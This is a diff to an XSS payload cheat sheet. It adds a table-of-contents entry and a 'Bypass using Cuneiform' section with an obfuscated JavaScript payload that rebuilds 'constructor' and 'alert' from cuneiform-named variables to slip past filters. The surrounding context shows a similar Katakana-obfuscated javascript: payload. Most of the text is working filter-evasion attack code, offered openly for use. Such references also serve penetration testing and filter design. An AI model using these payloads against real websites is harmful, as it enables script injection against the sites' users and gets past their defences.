@@ -49,6 +49,7 @@ Cross-site scripting (XSS) is a type of computer security vulnerability typicall
   - [Bypass ";" using another character](#bypass-using------using-another-character)
   - [Bypass using HTML encoding](#bypass-using-html-encoding)
   - [Bypass using Katana](#bypass-using-katana)
+  - [Bypass using Cuneiform](#bypass-using-cuneiform)
   - [Bypass using Lontara](#bypass-using-lontara)
   - [Bypass using ECMAScript6](#bypass-using-ecmascript6)
   - [Bypass using Octal encoding](#bypass-using-octal-encoding)
@@ -832,6 +833,15 @@ Using the [Katakana](https://github.com/aemkei/katakana.js) library.
 
 ```javascript
 javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
+```
+
+### Bypass using Cuneiform
+
+```javascript
+𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
+𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]
++(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]
++𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()
 ```
 
 ### Bypass using Lontara
